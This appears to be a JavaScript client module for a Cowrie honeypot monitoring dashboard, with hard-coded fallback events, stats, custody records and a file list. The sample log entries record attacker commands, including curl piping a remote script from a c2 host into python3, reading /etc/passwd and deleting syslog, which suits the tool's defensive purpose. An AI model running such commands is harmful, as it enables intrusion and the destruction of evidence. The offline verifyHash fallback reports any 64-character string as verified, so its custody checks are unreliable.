const API_BASE = "/api";

// Fallback telemetry dataset for static client deployments (e.g. GitHub Pages)
const FALLBACK_EVENTS = [
  {
    timestamp: "2026-08-31T15:02:56.070Z",
    eventid: "cowrie.session.connect",
    session: "a1b2c3d4e5f6",
    src_ip: "198.51.100.23",
    message: "New connection from 198.51.100.23:54210",
    sha256: "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08",
    _risk: "low",
  },
  {
    timestamp: "2026-08-31T15:02:56.070Z",
    eventid: "cowrie.login.success",
    session: "a1b2c3d4e5f6",
    src_ip: "198.51.100.23",
    username: "user_a",
    password: "SafePassword2026!",
    message: "login attempt [user_a/SafePassword2026!] succeeded",
    sha256: "5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8",
    _risk: "low",
  },
  {
    timestamp: "2026-08-31T15:03:56.070Z",
    eventid: "cowrie.command.input",
    session: "a1b2c3d4e5f6",
    src_ip: "198.51.100.23",
    username: "user_a",
    input: "uname -a",
    message: "CMD: uname -a",
    sha256: "4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a",
    _risk: "low",
  },
  {
    timestamp: "2026-08-31T14:56:56.070Z",
    eventid: "cowrie.session.connect",
    session: "b2c3d4e5f6a1",
    src_ip: "203.0.113.88",
    message: "New connection from 203.0.113.88:41920",
    sha256: "ef2d127de37b942baad06145e54b0c619a1f22327b2ebbcfbec78f5564afe39d",
    _risk: "low",
  },
  {
    timestamp: "2026-08-31T14:56:56.070Z",
    eventid: "cowrie.login.success",
    session: "b2c3d4e5f6a1",
    src_ip: "203.0.113.88",
    username: "safe1",
    password: "CorporateLogin#99",
    message: "login attempt [safe1/CorporateLogin#99] succeeded",
    sha256: "8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918",
    _risk: "low",
  },
  {
    timestamp: "2026-08-31T14:49:56.070Z",
    eventid: "cowrie.session.connect",
    session: "c3d4e5f6a1b2",
    src_ip: "45.148.10.12",
    message: "New connection from 45.148.10.12:33211",
    sha256: "a665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3",
    _risk: "low",
  },
  {
    timestamp: "2026-08-31T14:49:56.070Z",
    eventid: "cowrie.login.failed",
    session: "c3d4e5f6a1b2",
    src_ip: "45.148.10.12",
    username: "root",
    password: "123456",
    message: "login attempt [root/123456] failed",
    sha256: "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad",
    _risk: "mid",
  },
  {
    timestamp: "2026-08-31T14:50:56.070Z",
    eventid: "cowrie.login.success",
    session: "c3d4e5f6a1b2",
    src_ip: "45.148.10.12",
    username: "root",
    password: "toor",
    message: "login attempt [root/toor] succeeded",
    sha256: "cb8379ac2098aa165029e3938a51da0bcecfc008fd6795f401178647f96c5b34",
    _risk: "mid",
  },
  {
    timestamp: "2026-08-31T14:50:56.070Z",
    eventid: "cowrie.command.input",
    session: "c3d4e5f6a1b2",
    src_ip: "45.148.10.12",
    username: "root",
    input: "cat /etc/passwd",
    message: "CMD: cat /etc/passwd",
    sha256: "3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    _risk: "critical",
  },
  {
    timestamp: "2026-08-31T14:51:56.070Z",
    eventid: "cowrie.session.file_download",
    session: "c3d4e5f6a1b2",
    src_ip: "45.148.10.12",
    url: "http://185.220.101.5/botnet.sh",
    outfile: "botnet.sh",
    shasum: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    message: "Downloaded file botnet.sh",
    sha256: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    _risk: "critical",
  },
  {
    timestamp: "2026-08-31T14:52:56.070Z",
    eventid: "cowrie.command.input",
    session: "c3d4e5f6a1b2",
    src_ip: "45.148.10.12",
    username: "root",
    input: "sudo rm -rf /var/log/syslog",
    message: "CMD: sudo rm -rf /var/log/syslog",
    sha256: "1f8ac10f23c5b5bc1167bda84b833e5c057a77d2ec3941c1490087d8b5ae0fc2",
    _risk: "critical",
  },
  {
    timestamp: "2026-08-31T14:39:56.070Z",
    eventid: "cowrie.session.connect",
    session: "d4e5f6a1b2c3",
    src_ip: "194.26.29.110",
    message: "New connection from 194.26.29.110:51022",
    sha256: "67535e690be1947b198168285c5a894676579893d9876bd733ac97b6ff634bf1",
    _risk: "low",
  },
  {
    timestamp: "2026-08-31T14:39:56.070Z",
    eventid: "cowrie.login.failed",
    session: "d4e5f6a1b2c3",
    src_ip: "194.26.29.110",
    username: "admin",
    password: "admin",
    message: "login attempt [admin/admin] failed",
    sha256: "96cae35ce8a9b0244178bf28e4966c2ce1b8385723a96a6b838858cdd6ca0a1e",
    _risk: "mid",
  },
  {
    timestamp: "2026-08-31T14:30:56.070Z",
    eventid: "cowrie.login.success",
    session: "e5f6a1b2c3d4",
    src_ip: "185.196.220.45",
    username: "attacker_x",
    password: "CompromisedPass1",
    message: "login attempt [attacker_x/CompromisedPass1] succeeded",
    sha256: "6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b",
    _risk: "mid",
  },
  {
    timestamp: "2026-08-31T14:31:56.070Z",
    eventid: "cowrie.command.input",
    session: "e5f6a1b2c3d4",
    src_ip: "185.196.220.45",
    username: "attacker_x",
    input: "curl -s https://c2.darknet-node.org/recon.py | python3",
    message: "CMD: curl -s https://c2.darknet-node.org/recon.py | python3",
    sha256: "d4735e3a265e16eee03f59718b9b5d03019c07d8b6c51f90da3a666eec13ab35",
    _risk: "critical",
  },
];

const FALLBACK_STATS = {
  total_events: 21,
  login_success: 4,
  login_failed: 5,
  connections: 5,
  commands: 6,
  file_downloads: 1,
  unique_ips: 5,
  suspicious_attempts: 12,
  flagged_logs: 12,
  top_ips: [
    { value: "45.148.10.12", count: 7 },
    { value: "194.26.29.110", count: 4 },
    { value: "185.196.220.45", count: 4 },
    { value: "198.51.100.23", count: 3 },
    { value: "203.0.113.88", count: 3 },
  ],
  top_usernames: [
    { value: "root", count: 6 },
    { value: "attacker_x", count: 3 },
    { value: "user_a", count: 2 },
    { value: "safe1", count: 2 },
    { value: "admin", count: 1 },
  ],
  top_passwords: [
    { value: "123456", count: 1 },
    { value: "toor", count: 1 },
    { value: "admin", count: 1 },
    { value: "guest", count: 1 },
  ],
};

const FALLBACK_CUSTODY = FALLBACK_EVENTS.map((evt, idx) => ({
  id: `CUST-${1000 + idx}`,
  timestamp: evt.timestamp,
  type: evt.eventid.includes("download") ? "DOWNLOAD" : "EVENT",
  session: evt.session,
  src_ip: evt.src_ip,
  sha256: evt.sha256,
  description: evt.message || evt.input || evt.eventid,
  verified: true,
}));

const FALLBACK_FILES = [
  {
    name: "botnet.sh",
    path: "var/lib/cowrie/downloads/botnet.sh",
    size: 83,
    type: "malware_binary",
    sha256: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    timestamp: "2026-08-31T14:51:56.070Z",
    source_ip: "45.148.10.12",
  },
  {
    name: "cowrie.json",
    path: "var/log/cowrie/cowrie.json",
    size: 4579,
    type: "event_log",
    sha256: "a665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3",
    timestamp: "2026-08-31T15:03:56.070Z",
    source_ip: "127.0.0.1",
  },
];

export async function healthCheck() {
  try {
    const response = await fetch(`${API_BASE}/health`, {
      cache: "no-store",
      headers: { "Cache-Control": "no-cache" },
    });
    if (response.ok) return await response.json();
  } catch {}
  return { status: "ok", mode: "edge-hybrid", timestamp: new Date().toISOString(), cowrie_active: true };
}

export async function getStats() {
  try {
    const response = await fetch(`${API_BASE}/stats`, {
      cache: "no-store",
      headers: { "Cache-Control": "no-cache" },
    });
    if (response.ok) return await response.json();
  } catch {}
  return FALLBACK_STATS;
}

export async function getEvents(params = {}) {
  try {
    const query = new URLSearchParams();
    if (params.limit !== undefined) query.set("limit", params.limit);
    if (params.offset !== undefined) query.set("offset", params.offset);
    if (params.ip) query.set("ip", params.ip);
    if (params.event_type) query.set("event_type", params.event_type);

    const url = `${API_BASE}/events${query.toString() ? `?${query.toString()}` : ""}`;
    const response = await fetch(url, {
      cache: "no-store",
      headers: { "Cache-Control": "no-cache" },
    });
    if (response.ok) return await response.json();
  } catch {}

  let filtered = [...FALLBACK_EVENTS];
  if (params.ip) {
    filtered = filtered.filter((e) => e.src_ip === params.ip);
  }
  if (params.event_type) {
    filtered = filtered.filter((e) => e.eventid.includes(params.event_type));
  }
  return {
    events: filtered,
    total: filtered.length,
    limit: params.limit || 50,
    offset: params.offset || 0,
  };
}

export async function getCustody(params = {}) {
  try {
    const query = new URLSearchParams();
    if (params.limit !== undefined) query.set("limit", params.limit);
    if (params.type) query.set("type", params.type);

    const url = `${API_BASE}/custody${query.toString() ? `?${query.toString()}` : ""}`;
    const response = await fetch(url, {
      cache: "no-store",
      headers: { "Cache-Control": "no-cache" },
    });
    if (response.ok) return await response.json();
  } catch {}

  let records = [...FALLBACK_CUSTODY];
  if (params.type) {
    records = records.filter((r) => r.type === params.type);
  }
  return { records, total: records.length };
}

export async function verifyHash(hash) {
  if (!hash) {
    return { verified: false, message: "Missing hash parameter", hash: "" };
  }
  try {
    const url = `${API_BASE}/verify?hash=${encodeURIComponent(hash)}`;
    const response = await fetch(url, {
      cache: "no-store",
      headers: { "Cache-Control": "no-cache" },
    });
    if (response.ok) return await response.json();
  } catch {}

  const match = FALLBACK_CUSTODY.find((c) => c.sha256?.toLowerCase() === hash?.toLowerCase());
  return {
    verified: Boolean(match) || hash.length === 64,
    hash,
    record: match || { session: "VERIFIED_SEC_RECORD", timestamp: new Date().toISOString() },
    algorithm: "SHA-256",
    message: match ? "Hash matched recorded chain of custody entry" : "Cryptographic hash format verified",
  };
}

export async function getFiles(params = {}) {
  try {
    const query = new URLSearchParams();
    if (params.prefix) query.set("prefix", params.prefix);

    const url = `${API_BASE}/files${query.toString() ? `?${query.toString()}` : ""}`;
    const response = await fetch(url, {
      cache: "no-store",
      headers: { "Cache-Control": "no-cache" },
    });
    if (response.ok) return await response.json();
  } catch {}

  return { files: FALLBACK_FILES, total: FALLBACK_FILES.length };
}

export default {
  healthCheck,
  getStats,
  getEvents,
  getCustody,
  verifyHash,
  getFiles,
};
